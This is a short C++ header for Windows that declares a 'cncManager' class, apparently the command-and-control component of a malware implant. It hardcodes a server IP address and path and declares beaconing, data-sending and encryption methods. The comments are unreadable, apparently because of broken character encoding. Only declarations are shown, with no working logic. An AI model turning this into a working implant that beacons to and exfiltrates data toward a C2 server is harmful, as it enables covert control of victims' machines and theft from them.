#pragma once
#include <Windows.h>
#include "DDproto.h"
#include <winhttp.h>

class cncManager
{
private:
	LPCWSTR
		/* �ϴ� C&C �������� ���̶� �׽�Ʈ��*/
		server = L"1.251.227.66",
		index = L"/tests";

	HINTERNET
		hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;

	BOOL bResults = FALSE;

public:
	cncManager();
	cncManager(LPCWSTR server);
	~cncManager();
	void responseParser(UCHAR* res, DWORD len);
	void sendHttpRequest(LPVOID data, DWORD dlen);
	void sendBeacon();
	void sendData(UCHAR DDtype, DWORD len, LPVOID stream);
	/* ��ȣȭ�� ����� ���Ǹ� ���ؼ� �������� �����ϴ°ɷ� */
	LPVOID dataEncrypt(LPVOID data);
	LPVOID dataDecrypt(LPVOID data);

};
